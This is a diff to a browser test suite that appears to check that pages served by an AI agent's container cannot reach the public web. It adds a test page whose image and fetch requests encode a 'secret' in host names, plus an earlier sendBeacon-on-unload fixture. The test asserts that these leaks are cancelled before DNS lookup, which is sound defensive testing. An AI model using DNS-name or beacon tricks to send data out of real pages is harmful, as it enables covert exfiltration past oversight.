@@ -1,9 +1,13 @@
+import { mkdtemp, rm } from "node:fs/promises";
+import os from "node:os";
+import path from "node:path";
 import { afterAll, beforeAll, expect, it } from "vitest";
 import { dispatch, state, waitFor } from "./firefox";
 import { launchRessac, type LaunchedRessac } from "./launch";
 import type { Marionette } from "./marionette";
 import { startServer } from "./server";
 import { inBrowser } from "./sites";
+import { NET_PREFS, netEnv, resolvedNames, SFX } from "./ui-network";
 
 // A page the agent serves on its container's ports reaches only local addresses (and a few CDNs): the "public"
 // server is 127.0.0.1, declared public for the test; the agent page is opened on localhost.
@@ -15,7 +19,9 @@ let web: Awaited<ReturnType<typeof startServer>>;
 let agent: Awaited<ReturnType<typeof startServer>>;
 let w: LaunchedRessac;
 let m: Marionette;
+let logDir: string;
 beforeAll(async () => {
+  logDir = await mkdtemp(path.join(os.tmpdir(), "ressac-dnslog-"));
   web = await startServer({ routes: { "/arrive": html("<title>arrive</title>") } });
   const to = web.url;
   agent = await startServer({
@@ -26,9 +32,11 @@ beforeAll(async () => {
       ),
       "/beacon": html(`<title>beacon</title><script>addEventListener("pagehide", () => navigator.sendBeacon("${to}/beacon?d=1", "x"))</script>`),
       "/link": html(`<title>link</title><a id="out" href="${to}/arrive">out</a>`),
+      // A secret as a host name: the cancel must come before its DNS lookup.
+      "/dns": html(`<title>dns</title><img src="http://img-leak.${SFX}:${web.port}/p.png"><script>fetch("http://fetch-leak.${SFX}:${web.port}/f").catch(() => {})</script>`),
     },
   });
-  w = await launchRessac({ env: { RESSAC_TEST_PUBLIC_ADDRESSES: "127.0.0.1", RESSAC_CONTAINER_PORTS: `${agent.port}-${agent.port}` } });
+  w = await launchRessac({ prefs: NET_PREFS, env: { ...netEnv(logDir), RESSAC_TEST_PUBLIC_ADDRESSES: "127.0.0.1", RESSAC_CONTAINER_PORTS: `${agent.port}-${agent.port}` } });
   m = w.marionette;
   await m.setContext("chrome");
   await waitFor(m, "return !!window.ressacWindow && gBrowser.tabs.some((t) => t.hasAttribute('ressac-parking'))", (v) => v === true);
@@ -37,6 +45,7 @@ afterAll(async () => {
   await w?.close();
   await agent?.close();
   await web?.close();
+  if (logDir) await rm(logDir, { recursive: true, force: true });
 });
 
 const open = async (url: string) => {
@@ -78,4 +87,13 @@ it("a beacon an agent page sends as it unloads never reaches the web", async () 
   await waitFor(m, "return gBrowser.selectedBrowser.currentURI.spec", (v: string) => v === `${web.url}/arrive`);
   await sleep(1000);
   expect(web.paths).not.toContain("/beacon");
+});
+
+it("an agent page's request to a public name is cancelled before its DNS lookup", async () => {
+  await open(`http://localhost:${agent.port}/dns`);
+  // The witness: a tab's own navigation resolves its name, so the log does record lookups.
+  await dispatch(m, { type: "openTab", windowId: (await state(m)).windows[0]!.id, url: `http://witness.${SFX}:${web.port}/arrive`, activate: true });
+  await expect.poll(() => resolvedNames(logDir), { timeout: 15_000 }).toContain("witness");
+  const names = await resolvedNames(logDir);
+  expect(names.filter((n) => n.endsWith("-leak"))).toEqual([]);
 });
